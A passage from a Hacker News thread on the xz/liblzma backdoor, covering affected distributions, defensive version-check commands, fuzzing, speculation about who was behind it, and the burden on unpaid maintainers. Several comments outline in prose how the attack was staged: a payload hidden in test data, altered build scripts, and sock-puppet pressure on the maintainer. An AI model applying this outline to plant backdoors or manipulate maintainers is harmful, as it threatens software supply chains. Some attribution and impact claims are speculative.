| [sebiw](user?id=sebiw) [9 months ago](item?id=39878767)   | [parent](#39878714) | [next](#39879294) [–]  Arch Linux uses a native/unpatched version of OpenSSH without dependency on libsystemd and thus without dependency on xz-utils, resulting in no exploitable code path. This means that at least the currently talked about vulnerability/exploit via SSH did presumably not work on Arch. Disclaimer: This is my understanding of the currently circulating facts. Additional fallout might be possible, as the reverse engineering of the backdoor is ongoing. | | --- | --- | --- | | | |  |  | [Deathcrow](user?id=Deathcrow) [9 months ago](item?id=39881998)   | [root](#39878714) | [parent](#39878767) | [next](#39879564) [–]  This is only correct if the sshd backdoor is the only malicious code introduced into the library. | | --- | --- | --- | | | |  |  | [pas](user?id=pas) [9 months ago](item?id=39879564)   | [root](#39878714) | [parent](#39878767) | [prev](#39881998) | [next](#39879294) [–]  there are other ways for liblzma to get into ssh (via PAM and libselinux) | | --- | --- | --- | | | |  |  | [Phelinofist](user?id=Phelinofist) [9 months ago](item?id=39879294)   | [parent](#39878714) | [prev](#39878767) | [next](#39877673) [–]  Just to extend the sibling comment with an excerpt of the Arch announce mail regarding the backdoor: ```   >From the upstream report [1]:      &gt; openssh does not directly use liblzma. However debian and several other   distributions patch openssh to support systemd notification, and libsystemd   does depend on lzma.      Arch does not directly link openssh to liblzma, and thus this attack vector is not possible. You can confirm this by issuing the following command:        ```    ldd &quot;$(command -v sshd)&quot;    ```       However, out of an abundance of caution, we advise users to remove the malicious code from their system by upgrading either way. This is because other yet-to-be discovered methods to exploit the backdoor could exist. ``` | | --- | --- | --- | | | |  |  | [Animats](user?id=Animats) [9 months ago](item?id=39877673)   | [prev](#39878714) | [next](#39878124) [–]  Is there a git diff which shows this going in? | | --- | --- | --- | | | |  |  | [ptx](user?id=ptx) [9 months ago](item?id=39879406)   | [parent](#39877673) | [next](#39877833) [–]  I think they added it in parts over the course of a year or two, with each part being plausibly innocent-looking: First some testing infrastructure, some test cases with binary test data to test compression, updates to the build scripts – and then some updates to those existing binary files to put the obfuscated payload in place, modifications to the build scripts to activate it, etc. | | --- | --- | --- | | | |  |  | [tempodox](user?id=tempodox) [9 months ago](item?id=39877833)   | [parent](#39877673) | [prev](#39879406) | [next](#39878124) [–]  Apparently it’s not in the original repo, but in a build script in a distribution tar. | | --- | --- | --- | | | |  |  | [joshcryer](user?id=joshcryer) [9 months ago](item?id=39877921)   | [root](#39877673) | [parent](#39877833) | [next](#39878124) [–]  They also used social engineering to disable fuzzing which would have caught the discrepancy: <https://github.com/google/oss-fuzz/pull/10667> | | --- | --- | --- | | | |  |  | [codetrotter](user?id=codetrotter) [9 months ago](item?id=39878032)   | [root](#39877673) | [parent](#39877921) | [next](#39878964) [–]  It’s pretty funny how a bunch of people come piling reaction emojis onto the comments in the PR, *after* it has all become publicly known. I’m like.. bro, adding reaction emojis after the fact as if that makes any sort of difference to anything. | | --- | --- | --- | | | |  |  | [jijijijij](user?id=jijijijij) [9 months ago](item?id=39879019)   | [root](#39877673) | [parent](#39878032) | [next](#39878105) [–]  That thread has become an online event and obviously lost its original constructive purpose the moment the malicious intent became public. The commenters are not trying to alter history, it's leaving their mark in an historic moment. I mean the "lgtm" aged like milk and the emoji reactions are pretty funny commentary. | | --- | --- | --- | | | |  |  | [happosai](user?id=happosai) [9 months ago](item?id=39878105)   | [root](#39877673) | [parent](#39878032) | [prev](#39879019) | [next](#39878748) [–]  Honestly, it's harrasment at this point. | | --- | --- | --- | | | |  |  | [qudat](user?id=qudat) [9 months ago](item?id=39878748)   | [root](#39877673) | [parent](#39878032) | [prev](#39878105) | [next](#39878964) [–]  Feels almost like tampering with evidence at a crime scene | | --- | --- | --- | | | |  |  | [lazide](user?id=lazide) [9 months ago](item?id=39880312)   | [root](#39877673) | [parent](#39878748) | [next](#39879937) [–]  It’s just adding your initials on the tunnel someone famous just died in. | | --- | --- | --- | | | |  |  | [cqqxo4zV46cp](user?id=cqqxo4zV46cp) [9 months ago](item?id=39879937)   | [root](#39877673) | [parent](#39878748) | [prev](#39880312) | [next](#39878964) [–]  That’s absurd. Elaborate. | | --- | --- | --- | | | |  |  | [filleokus](user?id=filleokus) [9 months ago](item?id=39878964)   | [root](#39877673) | [parent](#39877921) | [prev](#39878032) | [next](#39878876) [–]  Would it really have caught it? | | --- | --- | --- | | | |  |  | [formerly\_proven](user?id=formerly_proven) [9 months ago](item?id=39879314)   | [root](#39877673) | [parent](#39878964) | [next](#39878876) [–]  No | | --- | --- | --- | | | |  |  | [pas](user?id=pas) [9 months ago](item?id=39879720)   | [root](#39877673) | [parent](#39879314) | [next](#39878876) [–]  ... why? | | --- | --- | --- | | | |  |  | [ycombinatrix](user?id=ycombinatrix) [9 months ago](item?id=39880134)   | [root](#39877673) | [parent](#39879720) | [next](#39880044) [–]  my understanding is that fuzzing "caught" the issue by crashing with ifunc disabled but it wouldn't have "caught" the backdoor which uses public key cryptography | | --- | --- | --- | | | |  |  | [filleokus](user?id=filleokus) [9 months ago](item?id=39880044)   | [root](#39877673) | [parent](#39879720) | [prev](#39880134) | [next](#39878876) [–]  Did the artefact produced [0] for fussing even include the backdoored .so? My understanding was that the compromised build-scripts had measures to only run when producing deb/rpms. [https://github.com/google/oss-fuzz/blob/5f70676a6c9050b9cb68...](https://github.com/google/oss-fuzz/blob/5f70676a6c9050b9cb687cdb1543354702a8c757/projects/xz/build.sh) | | --- | --- | --- | | | |  |  | [moomoo11](user?id=moomoo11) [9 months ago](item?id=39878876)   | [root](#39877673) | [parent](#39877921) | [prev](#39878964) | [next](#39878124) [–]  Is the person Jia who did this PR a malicious actor? | | --- | --- | --- | | | |  |  | [CSMastermind](user?id=CSMastermind) [9 months ago](item?id=39879146)   | [root](#39877673) | [parent](#39878876) | [next](#39878124) [–]  The person who submitted the PR, JiaT75, is. The person who approved and merged it is not. | | --- | --- | --- | | | |  |  | [Animats](user?id=Animats) [9 months ago](item?id=39881329)   | [root](#39877673) | [parent](#39879146) | [next](#39879327) [–]  Has that person been found yet? Does this problem require cops, or an airstrike? | | --- | --- | --- | | | |  |  | [moomoo11](user?id=moomoo11) [9 months ago](item?id=39879327)   | [root](#39877673) | [parent](#39879146) | [prev](#39881329) | [next](#39878124) [–]  Yeah that’s what I am asking. Thanks | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39878124)   | [prev](#39877673) | [next](#39882073) [–]  The headline seems like a distinction without a difference. Bypassing ssh auth means getting a root shell. There is no significant difference between that and running system(). At most maybe system() has less logging. | | --- | --- | --- | | | |  |  | [armitron](user?id=armitron) [9 months ago](item?id=39878167)   | [parent](#39878124) | [next](#39882073) [–]  > Bypassing ssh auth means getting a root shell Only if you're allowed to login as root, which is definitely not the case everywhere. | | --- | --- | --- | | | |  |  | [juliusdavies](user?id=juliusdavies) [9 months ago](item?id=39879165)   | [root](#39878124) | [parent](#39878167) | [next](#39879147) [–]  My sense was this backdoor gets to execute whatever it wants using whatever "user" sshd is running as. So even if root logins are disabled, this backdoor doesn't care. | | --- | --- | --- | | | |  |  | [colinsane](user?id=colinsane) [9 months ago](item?id=39879147)   | [root](#39878124) | [parent](#39878167) | [prev](#39879165) | [next](#39880873) [–]  not only that, but logins show up in logs. | | --- | --- | --- | | | |  |  | [wepple](user?id=wepple) [9 months ago](item?id=39880873)   | [root](#39878124) | [parent](#39878167) | [prev](#39879147) | [next](#39882073) [–]  Plus, detection is likely to be be very different. | | --- | --- | --- | | | |  |  | [nprateem](user?id=nprateem) [9 months ago](item?id=39882073)   | [prev](#39878124) | [next](#39895180) [–]  We basically need to analyse dependencies used in critical code paths (e.g. network attached services like sshd) and then start a process to add more rigorous controls around them. Some kind of enhanced scrutiny, certification and governance instead of relying on repos with individual maintainers and no meaningful code reviews, branch protection, etc. And by *we* I mean at international/governmental level. Free software needs to stop being $free. Society needs to start paying for the critical foundations upon which we all stand. | | --- | --- | --- | | | |  |  | [geenat](user?id=geenat) [9 months ago](item?id=39895180)   | [prev](#39882073) | [next](#39879872) [–]  Similar exploit vector in Swoole and exactly why it was forked for Open Swoole: [https://old.reddit.com/r/PHP/comments/1b9acx3/article\_intro\_...](https://old.reddit.com/r/PHP/comments/1b9acx3/article_intro_to_swoole_and_async_php/ktxfboi/) Binary blobs under the guise of "testing"- exploit targeting a dependent library. Thankfully this only effects Swoole users, not all of PHP. | | --- | --- | --- | | | |  |  | [rany\_](user?id=rany_) [9 months ago](item?id=39879872)   | [prev](#39895180) | [next](#39880435) [–]  If my server doesn't have any RSA public keys in its authorized\_keys, only ed25519 keys; does this backdoor just not work? | | --- | --- | --- | | | |  |  | [adtac](user?id=adtac) [9 months ago](item?id=39882036)   | [parent](#39879872) | [next](#39882016) [–]  It will still work if the connecting client offers a RSA key. The only real way to be sure it's not on your system is if your liblzma version is strictly less than 5.6.0 (first infected version): ```     ls -al $(ldd $(which sshd) | grep lzma | awk '{ print $3 }') ``` | | --- | --- | --- | | | |  |  | [rany\_](user?id=rany_) [9 months ago](item?id=39882416)   | [root](#39879872) | [parent](#39882036) | [next](#39882016) [–]  Thanks for the reply, I was just curious because `RSA\_public\_decrypt` threw me off. | | --- | --- | --- | | | |  |  | [adtac](user?id=adtac) [9 months ago](item?id=39882448)   | [root](#39879872) | [parent](#39882416) | [next](#39882016) [–]  FWIW RSA\_public\_decrypt is an 90s way of saying RSA\_signature\_validate | | --- | --- | --- | | | |  |  | [keiba](user?id=keiba) [9 months ago](item?id=39882016)   | [parent](#39879872) | [prev](#39882036) | [next](#39880435) [–]  This backdoor does not care about any of the authorisation configuration set by the user. It is executed before that step. So just make sure you are not affected. | | --- | --- | --- | | | |  |  | [rany\_](user?id=rany_) [9 months ago](item?id=39882427)   | [root](#39879872) | [parent](#39882016) | [next](#39880435) [–]  It was just that it hooks to `RSA\_public\_decrypt` which threw me off, I didn't really understand this backdoor much. I only have one Debian sid machine which was vulnerable and accessible via a public IPv4 ssh, I'm not sure if I should just wipe it. | | --- | --- | --- | | | |  |  | [DrTung](user?id=DrTung) [9 months ago](item?id=39880435)   | [prev](#39879872) | [next](#39880945) [–]  If the RCE is Russian, it could be used a communication kill-switch on the morning of an attack outside Ukraine, similar to the Viasat hack <https://en.m.wikipedia.org/wiki/Viasat_hack> | | --- | --- | --- | | | |  |  | [KnightHawk3](user?id=KnightHawk3) [9 months ago](item?id=39881041)   | [parent](#39880435) | [next](#39880945) [–]  Why does it have to be russian? Could be any country, even USA, China. I don't see why this sort of attack is limited to Russia. | | --- | --- | --- | | | |  |  | [timeon](user?id=timeon) [9 months ago](item?id=39882165)   | [root](#39880435) | [parent](#39881041) | [next](#39881595) [–]  > Why does it have to be russian? Could be any country, even USA, China. Are you sure you are replying to right comment? Because they did not implied it was not other country or actor. It even directly starts with 'IF'. | | --- | --- | --- | | | |  |  | [KnightHawk3](user?id=KnightHawk3) [9 months ago](item?id=39890367)   | [root](#39880435) | [parent](#39882165) | [next](#39881595) [–]  doesnt track if russian -> could be ... why would being russian make it this? it could be if it was made in any country. they did this attack once, okay? but its not like other countries dont pay attention. | | --- | --- | --- | | | |  |  | [spxneo](user?id=spxneo) [9 months ago](item?id=39881595)   | [root](#39880435) | [parent](#39881041) | [prev](#39882165) | [next](#39880945) [–]  Exactly I don't understand the obsession with Russia Literally just a country with people like you and me. "Jia Tan" does not sound Russian [https://boehs.org/node/everything-i-know-about-the-xz-backdo...](https://boehs.org/node/everything-i-know-about-the-xz-backdoor) | | --- | --- | --- | | | |  |  | [jsploit](user?id=jsploit) [9 months ago](item?id=39881697)   | [root](#39880435) | [parent](#39881595) | [next](#39880945) [–]  > "Jia Tan" does not sound Russian It's not a real name. | | --- | --- | --- | | | |  |  | [trallnag](user?id=trallnag) [9 months ago](item?id=39882187)   | [root](#39880435) | [parent](#39881697) | [next](#39880945) [–]  What about X Æ A-12? | | --- | --- | --- | | | |  |  | [tambourine\_man](user?id=tambourine_man) [9 months ago](item?id=39880945)   | [prev](#39880435) | [next](#39885404) [–]  I’d like to know what we mortals – those that run Ubuntu LTS on VMs, for instance — need to do, if anything. | | --- | --- | --- | | | |  |  | [geggo98](user?id=geggo98) [9 months ago](item?id=39882350)   | [parent](#39880945) | [next](#39881795) [–]  My suggestion: Put your SSH behind WireGuard and/or behind a jump host (with only port forwarding allowed, no shell). If you don’t have a separate host, use a Docker container. If you use a jump host, consider a different OS (e.g., BSD vs Linux). Remember this analogy with slices of Swiss cheese used during the pandemics? If one slice has a hole, the next slice hopefully won’t have a hole on the same position. The more slices you have, the better for you. Although for remote management, you don’t want to have too many “slices” you have to manage and that can fail. | | --- | --- | --- | | | |  |  | [pilgrim0](user?id=pilgrim0) [9 months ago](item?id=39881795)   | [parent](#39880945) | [prev](#39882350) | [next](#39880950) [–]  I would, by routine, advise that publicly available boxes are configured to accept connections only from whitelisted sources, doing that at the lowest possible level on the stack. That’s usually how secure environments such as those used in PCI compliant topologies are specified. | | --- | --- | --- | | | |  |  | [Valord](user?id=Valord) [9 months ago](item?id=39880950)   | [parent](#39880945) | [prev](#39881795) | [next](#39885404) [–]  Same! | | --- | --- | --- | | | |  |  | [somethingsaid](user?id=somethingsaid) [9 months ago](item?id=39880970)   | [root](#39880945) | [parent](#39880950) | [next](#39885404) [–]  Right now, nothing. The issue didn’t reach mainstream builds except nightly Red Hat and Fedora 41. The xz version affected has already been pulled and won’t be included in any future software versions. | | --- | --- | --- | | | |  |  | [alsadi](user?id=alsadi) [9 months ago](item?id=39885404)   | [prev](#39880945) | [next](#39879847) [–]  Untill the entire scope of this is identified I suggest activating the kill switch [https://bcksp.blogspot.com/2024/03/how-to-disable-xz-backdoo...](https://bcksp.blogspot.com/2024/03/how-to-disable-xz-backdoor-or-alike-in.html?m=1) | | --- | --- | --- | | | |  |  | [dboreham](user?id=dboreham) [9 months ago](item?id=39879847)   | [prev](#39885404) | [next](#39880973) [–]  So this is called the house of cards backdoor now? | | --- | --- | --- | | | |  |  | [willtemperley](user?id=willtemperley) [9 months ago](item?id=39880973)   | [prev](#39879847) | [next](#39881009) [–]  Another good reason to use a firewall with an IP address allowlist for SSH. | | --- | --- | --- | | | |  |  | [adtac](user?id=adtac) [9 months ago](item?id=39882055)   | [parent](#39880973) | [next](#39881009) [–]  And now for my next trick: smuggling a backdoor into iptables. | | --- | --- | --- | | | |  |  | [willtemperley](user?id=willtemperley) [9 months ago](item?id=39882220)   | [root](#39880973) | [parent](#39882055) | [next](#39881009) [–]  Ha yes. I rely on cloud-provided security groups for that. So I blindly have to believe my provider is immune to supply chain attacks. | | --- | --- | --- | | | |  |  | [ngcc\_hk](user?id=ngcc_hk) [9 months ago](item?id=39881009)   | [prev](#39880973) | [next](#39891113) [–]  Whilst we are in 3bp mode, what happen if a state actor want to harm open source … not to destroy it but to pollute it … as said you can check and test all. Legal … they do not care. I wonder. … We are all good vs even Buddha has evil nature mental model. | | --- | --- | --- | | | |  |  | [twisteddiana](user?id=twisteddiana) [9 months ago](item?id=39891113)   | [prev](#39881009) | [next](#39880613) [–]  Would be awesome if this was an April fool's day joke! | | --- | --- | --- | | | |  |  | [circusfly](user?id=circusfly) [9 months ago](item?id=39880613)   | [prev](#39891113) | [next](#39879423) [–]  Could the backdoor have targeted Wireguard instead of ssh? | | --- | --- | --- | | | |  |  | [circusfly](user?id=circusfly) [9 months ago](item?id=39884949)   | [parent](#39880613) | [next](#39886035) [–]  Down voted for asking a valid question? Or is every reader of every HN post expected to be an in depth expert in every article posted every minute of every day of the year? What kind of asshole who has earned the right to down vote comments on HN would down vote a legitimate question? | | --- | --- | --- | | | |  |  | [d-z-m](user?id=d-z-m) [9 months ago](item?id=39886035)   | [parent](#39880613) | [prev](#39884949) | [next](#39880651) [–]  My first instinct would be no, as wireguard runs in kernel space(if you're using kernel wireguard, not wireguard-go/some other userspace implementation),and couldn't link in liblzma, a userspace component. | | --- | --- | --- | | | |  |  | [supposemaybe](user?id=supposemaybe) [9 months ago](item?id=39880651)   | [parent](#39880613) | [prev](#39886035) | [next](#39879423) [–]  Ssh is shell, whereas wireguard is a vpn. You will still be vulnerable as you can connect to an ssh server through your wireguard tunnel. | | --- | --- | --- | | | |  |  | [d-z-m](user?id=d-z-m) [9 months ago](item?id=39885988)   | [root](#39880613) | [parent](#39880651) | [next](#39880774) [–]  I don't think that's what OP is asking. I think OP is asking if wireguard functions could be hooked in the same way as sshd functions are in this exploit. | | --- | --- | --- | | | |  |  | [circusfly](user?id=circusfly) [9 months ago](item?id=39880774)   | [root](#39880613) | [parent](#39880651) | [prev](#39885988) | [next](#39879423) [–]  Well, yes, I can, but unlike ssh which is open to the world, my VPN is only open to me and the family. It seems like that greatly reduces the potential attack surface. | | --- | --- | --- | | | |  |  | [pcthrowaway](user?id=pcthrowaway) [9 months ago](item?id=39879423)   | [prev](#39880613) | [next](#39881184) [–]  Has anyone proposed a name for this exploit yet? | | --- | --- | --- | | | |  |  | [LeoPanthera](user?id=LeoPanthera) [9 months ago](item?id=39880198)   | [parent](#39879423) | [next](#39879621) [–]  LZMAO | | --- | --- | --- | | | |  |  | [77pt77](user?id=77pt77) [9 months ago](item?id=39880766)   | [root](#39879423) | [parent](#39880198) | [next](#39879621) [–]  This should be it. It's by far the best, because someone is definitely "LMAO". | | --- | --- | --- | | | |  |  | [aaronmdjones](user?id=aaronmdjones) [9 months ago](item?id=39879621)   | [parent](#39879423) | [prev](#39880198) | [next](#39880042) [–]  CVE-2024-3094 | | --- | --- | --- | | | |  |  | [chr-s](user?id=chr-s) [9 months ago](item?id=39879900)   | [root](#39879423) | [parent](#39879621) | [next](#39880042) [–]  "Backdoor in upstream xz/liblzma leading to ssh server compromise"[0] isn't bad either. [0]<https://www.openwall.com/lists/oss-security/2024/03/29/4> | | --- | --- | --- | | | |  |  | [TheSmoke](user?id=TheSmoke) [9 months ago](item?id=39880042)   | [parent](#39879423) | [prev](#39879621) | [next](#39880260) [–]  doordassh :) | | --- | --- | --- | | | |  |  | [pcthrowaway](user?id=pcthrowaway) [9 months ago](item?id=39882061)   | [root](#39879423) | [parent](#39880042) | [next](#39880260) [–]  ooh I like this one. I'd propose: backdoordassh But I wonder if they'd run into trademark issues | | --- | --- | --- | | | |  |  | [fullstop](user?id=fullstop) [9 months ago](item?id=39880260)   | [parent](#39879423) | [prev](#39880042) | [next](#39879562) [–]  Jia-had | | --- | --- | --- | | | |  |  | [pixelbeat\_\_](user?id=pixelbeat__) [9 months ago](item?id=39879562)   | [parent](#39879423) | [prev](#39880260) | [next](#39879491) [–]  rxzec | | --- | --- | --- | | | |  |  | [kstrauser](user?id=kstrauser) [9 months ago](item?id=39879491)   | [parent](#39879423) | [prev](#39879562) | [next](#39882398) [–]  Dragon Gate. There’s my contribution. | | --- | --- | --- | | | |  |  | [jaza](user?id=jaza) [9 months ago](item?id=39882398)   | [parent](#39879423) | [prev](#39879491) | [next](#39879836) [–]  All Your SSH Are Belong To Us | | --- | --- | --- | | | |  |  | [denysvitali](user?id=denysvitali) [9 months ago](item?id=39879836)   | [parent](#39879423) | [prev](#39882398) | [next](#39880953) [–]  Pick one: xzdoor, backdoorssh | | --- | --- | --- | | | |  |  | [thefilmore](user?id=thefilmore) [9 months ago](item?id=39880953)   | [parent](#39879423) | [prev](#39879836) | [next](#39881184) [–]  xzploit | | --- | --- | --- | | | |  |  | [ivlad](user?id=ivlad) [9 months ago](item?id=39881184)   | [prev](#39879423) | [next](#39885697) [–]  Doesn’t certificate verification occur in PrevSep process? If so, this would only grant RCE with nobody’s privilege. | | --- | --- | --- | | | |  |  | [tonymet](user?id=tonymet) [9 months ago](item?id=39885697)   | [prev](#39881184) | [next](#39879976) [–]  Who was the author ? | | --- | --- | --- | | | |  |  | [tonymet](user?id=tonymet) [9 months ago](item?id=39898075)   | [parent](#39885697) | [next](#39879976) [–]  A subsequent investigation found that the backdoor was a culmination of approximately 3 years of effort by a user going by the name Jia Tan and the nickname JiaT75, who appears to have made a concentrated effort to gain access to a position of trust within the xz project, by putting pressure on the head maintainer to step down and hand over the control of the project.[3] | | --- | --- | --- | | | |  |  | [creato](user?id=creato) [9 months ago](item?id=39879976)   | [prev](#39885697) | [next](#39879302) [–]  One of the takeaways from this to me is that there is *way* too much sketchy bullshit happening in critical system software. Prebuilt binary blobs [1]? Rewriting calls to SIMD enhanced versions at runtime [2]? *Disabling sanitizers* [3]? Incomprehensible build scripts [4]? All of this was either at least strongly frowned upon, if not outright unacceptable, on every project I've ever worked on, either professionally or for fun. And the stakes were far lower for those projects than critical linux system software. 1. <https://lwn.net/Articles/967442/> 2, 3: <https://github.com/google/oss-fuzz/pull/10667> 4. <https://news.ycombinator.com/item?id=39866161> | | --- | --- | --- | | | |  |  | [nwallin](user?id=nwallin) [9 months ago](item?id=39880520)   | [parent](#39879976) | [next](#39881032) [–]  > Prebuilt binary blobs [1]? My understanding is that the binary blobs were test data. Find a bug that happens on certain input. Craft a payload that both triggers the bug and does the malicious thing you want to do. Add the binary blob to /tests/files/. Then write a legitimate test to ensure that the bug goes away. Then do some build script bullshit to somehow get that binary into the build. | | --- | --- | --- | | | |  |  | [ParetoOptimal](user?id=ParetoOptimal) [9 months ago](item?id=39881032)   | [parent](#39879976) | [prev](#39880520) | [next](#39880075) [–]  We should probably look into other fundamental dependencies like xz as well to see if similar practices are happening. | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39880075)   | [parent](#39879976) | [prev](#39881032) | [next](#39879302) [–]  > Rewriting calls to SIMD enhanced versions at runtime? That's something that's been done for decades. It's pretty normal. What's not normal is for that to get re-done after startup. That is, one library should not be able to get that resolution process to be re-done after it's been done once. Malicious code that knows the run-time linker-loader's data structures could still re-resolve things anyways, which means that even removing this feature altogether from the run-time linker-loader wouldn't prevent this particular aspect of this attack. I.e., you're barking up the wrong tree with (2). | | --- | --- | --- | | | |  |  | [SubiculumCode](user?id=SubiculumCode) [9 months ago](item?id=39879302)   | [prev](#39879976) | [next](#39878754) [–]  So is this backdoor active in Ubuntu distributions? | | --- | --- | --- | | | |  |  | [dboreham](user?id=dboreham) [9 months ago](item?id=39879924)   | [parent](#39879302) | [next](#39878754) [–]  It appears not. | | --- | --- | --- | | | |  |  | [bagels](user?id=bagels) [9 months ago](item?id=39878754)   | [prev](#39879302) | [next](#39878019) [–]  Why does xz need new features at this point? | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39878019)   | [prev](#39878754) | [next](#39879559) [–]  I have found it irritating how in the community, in recent years, it's popular to say that if a project doesn't have recent commits or releases that something is seriously wrong. This is a toxic attitude. There was nothing wrong with "unmaintained" lzma two years ago. The math of the lzma algorithm doesn't change. The library was "done" and that's ok. The whiny mailing list post from the sock puppet, complaining about the lack of speedy releases, which was little more than ad hominem attacks on the part time maintainer, is all too typical and we shouldn't assume those people are "right" or have any validity to their opinion. | | --- | --- | --- | | | |  |  | [cesarb](user?id=cesarb) [9 months ago](item?id=39878512)   | [parent](#39878019) | [next](#39878897) [–]  > The math of the lzma algorithm doesn't change. The library was "done" and that's ok. Playing devil's advocate: the math doesn't change, but the environment around it does. Just off the top of my head, we have: the 32-bit to 64-bit transition, the removal of pre-C89 support (<https://fedoraproject.org/wiki/Changes/PortingToModernC>) which requires an autotools update, the periodic tightening of undefined behaviors, new architectures like RISC-V, the increasing amount of cores and a slowdown in the increase of per-core speed, the periodic release of new and exciting vector instructions, and exotic security features like CHERI which require more care with things like pointer provenance. | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39878600)   | [root](#39878019) | [parent](#39878512) | [next](#39878897) [–]  > the 32-bit to 64-bit transition Lzma is from 2010. Amd64 became mainstream in the mid 2000s. > removal of pre-C89 support Ibid. Also, at the library API level, c89 compatible code is still pretty familiar to c99 and later. > new architectures like RISC-V Shouldn't matter for portable C code? > the increasing amount of cores and a slowdown in the increase of per-core speed, Iirc parallelism was already a focus of this library in the 2010s, I don't think it really needs a lot of work in that area. | | --- | --- | --- | | | |  |  | [snnn](user?id=snnn) [9 months ago](item?id=39879021)   | [root](#39878019) | [parent](#39878600) | [next](#39878897) [–]  Actually, the new architectures are a big source of concerns. As a maintainer of a large open source project, I often received pull requests for CPU architectures that I never had a chance to touch. Therefore I cannot build the code, cannot run the tests, and do not understand most of the code. C/C++ themselves are portable, but libs like xz needs to beat the other competitors on performance, which means you may need to use model specific SIMD instructions, query CPU cache size and topology, work at very low level. These code are not portable. When people add these code, they often need to add some tests, or disable some existing tests conditionally, or tweak the build scripts. So they are all risks. No matter how smart you are, you cannot forecast the future. Now many CPUs have a heterogeneous configuration, which means they have big cores and little cores. But do all the cores have the same capabilities? Is possible that a CPU instruction only available on some of the CPU cores? What does it mean for a multithreaded application? Would it be possible that 64-bit CPUs may drop the support for 32-bit at hardware level? Tens years ago you cannot predict what's going to happen today. Windows has a large compatibility layer, which allows you running old code on the latest hardware and latest Windows. It needs quite a lot efforts. Many applications would crash without the compatibility patches. | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39879068)   | [root](#39878019) | [parent](#39879021) | [next](#39878897) [–]  I am a former MS employee, I used to read the compatibility patches when I was bored at the office. Anyway, liblzma does not "need" to outperform any "competition". If someone wants to work on some performance optimization, it's completely fair to fork. Look at how many performance oriented forks there are of libjpeg. The vanilla libjpeg still works. | | --- | --- | --- | | | |  |  | [Hakkin](user?id=Hakkin) [9 months ago](item?id=39879400)   | [root](#39878019) | [parent](#39879068) | [next](#39880300) [–]  and then that fork becomes more performant or feature rich or secure or (etc), and it becomes preferred over the original code base, and all distributions switch to it, and we're back at square one. | | --- | --- | --- | | | |  |  | [snnn](user?id=snnn) [9 months ago](item?id=39880300)   | [root](#39878019) | [parent](#39879068) | [prev](#39879400) | [next](#39878897) [–]  The vanilla python works fine but conda is definitely more popular among data scientists. | | --- | --- | --- | | | |  |  | [rdtsc](user?id=rdtsc) [9 months ago](item?id=39878897)   | [parent](#39878019) | [prev](#39878512) | [next](#39878231) [–]  Excellent point. I believe that's coming from corporate supply chain attack "response" and their insistence on making hard rules about "currency" and "activity" and "is maintained" pushes this kind of crap. Attackers know this as well. It doesn't take much to hang around various mailing lists and look for stuff like this: [https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00567.html) > (Random user or sock puppet) Is XZ for Java still maintained? > (Lasse) I haven't lost interest but my ability to care has been fairly limited mostly due to ... > (Lasse) Recently I've worked off-list a bit with Jia Tan on XZ Utils and perhaps he will have a bigger role in the future, we'll see. It's also good to keep in mind that this is an unpaid hobby project With a few years worth of work by a team of 2-3 people: one writes and understand the code, one communicates, a few others pretend to be random users submitting ifunc patches, etc., you can end up controlling the project and signing releases. | | --- | --- | --- | | | |  |  | [Fnoord](user?id=Fnoord) [9 months ago](item?id=39880113)   | [root](#39878019) | [parent](#39878897) | [next](#39878231) [–]  > 7-Zip supports .xz and keeping its developer Igor Pavlov informed about format changes (including new filters) is important too. I've always found that dev's name to tilt me. Funnily enough, the Chinese name was no reason to investigate. It was a performance issue. Also, to the discussion that a distribution was targeted. Jia advocated Fedora to upgrade to 5.6.x. Fedora is the precursor for RHEL. Together with the backdoor not working when LANG not set (USA). Those are two details suggesting the target was USA. Though either or both could've been part of the deception. | | --- | --- | --- | | | |  |  | [snnn](user?id=snnn) [9 months ago](item?id=39878231)   | [parent](#39878019) | [prev](#39878897) | [next](#39878622) [–]  I mostly agree with you, but I think your argument is wrong. Last month I found a tiny bug in Unix's fgrep program(the bug has no risk). The program implements Aho Corasick algorithm, which hasn't changed much over decades. However, at least when the code was released to 4.4BSD, the bug still existed. It is not much a concern as nowadays most fgrep progroms are just an alias of grep. They do not use the old Unix code anymore. The old Unix code, and much part of FreeBSD, really couldn't meet today's security standard.For example, many text processing programs are vulnerable to DoS attacks when processing well-crafted input strings. I agree with you that in many cases we really don't need to touch the old code. However, it is not just because the algorithm didn't change. | | --- | --- | --- | | | |  |  | [bulatb](user?id=bulatb) [9 months ago](item?id=39878622)   | [parent](#39878019) | [prev](#39878231) | [next](#39879479) [–]  A software project has the features it implements, the capabilities it offers users, and the boundary between itself and the environment in which those features create value for the user by becoming capabilities. The "accounting" features in the source code may be finished and bug-free, but if the outside world has changed and now the user can't install the software, or it won't run on their system, or it's not compatible with other current software, then the software system doesn't grant the capability "accounting," even though the features are "finished." Nothing with a boundary is ever finished. Boundaries just keep the outside world from coming in too fast to handle. If you don't maintain them then eventually the system will be overwhelmed and fail, a little at a time, or all at once. | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39878698)   | [root](#39878019) | [parent](#39878622) | [next](#39879479) [–]  I feel like this narrative is especially untrue for things like lzma where the only dependencies are memory and CPU, and written in a stable language like C. I've had similar experiences porting code for things like image formats, audio codecs, etc. where the interface is basically "decode this buffer into another buffer using math". In most cases you can plop that kind of library right in without any maintenance at all, it might be decades old, and it works. The type of maintenance I would expect for that would be around security holes. Once I patched an old library like that to handle the fact that the register keyword was deprecated. | | --- | --- | --- | | | |  |  | [pas](user?id=pas) [9 months ago](item?id=39879779)   | [root](#39878019) | [parent](#39878698) | [next](#39880530) [–]  C is not stable, CPU microarchitecture versions are coming from time to time. LZMA compression is not far from trivial. the trade-offs made back then might not be the most useful ones now, hence there are usually things that make sense to change even if the background math will be the same forever. sure, churn and make believe maintenance for the sake of feeling good is harmful. (and that's where the larger community comes in, distributions, power users, etc. we need to help good maintainers, and push back against bad ones. and yes this is - of course - easier said than done.) | | --- | --- | --- | | | |  |  | [bulatb](user?id=bulatb) [9 months ago](item?id=39880530)   | [root](#39878019) | [parent](#39878698) | [prev](#39879779) | [next](#39879479) [–]  Smaller boundaries are likelier to need less maintenance, but nothing stands still. The reason you can run an 